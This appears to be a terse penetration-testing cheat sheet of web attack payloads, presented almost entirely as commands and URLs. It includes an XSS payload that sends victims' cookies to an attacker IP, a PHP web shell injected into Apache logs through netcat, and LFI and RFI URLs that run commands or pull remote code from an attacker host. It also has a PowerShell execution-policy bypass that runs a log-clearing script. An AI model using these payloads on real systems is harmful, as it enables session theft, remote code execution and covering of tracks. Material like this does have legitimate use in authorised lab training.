#### XSS

`<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>`

`powershell -ExecutionPolicy Bypass -File clear_logs.ps1`

`powershell -ExecutionPolicy Bypass -File admin_login.ps1`

### LOG POISONING

```
nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

```
### LFI

`http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`

### Running a server

`<?php echo shell_exec($_GET['cmd']); ?>`

`python -m SimpleHTTPServer 7331`

`python3 -m http.server 7331`

`php -S 0.0.0.0:8000`

`ruby -run -e httpd . -p 9000`

`busybox httpd -f -p 10000`

### PHP data wrapper used with LFI

`http://192.168.175.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22dir%22)%20?%3E`

### RFI

`http://192.168.175.10/menu2.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt?`

`http://192.168.175.10/menu.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt`


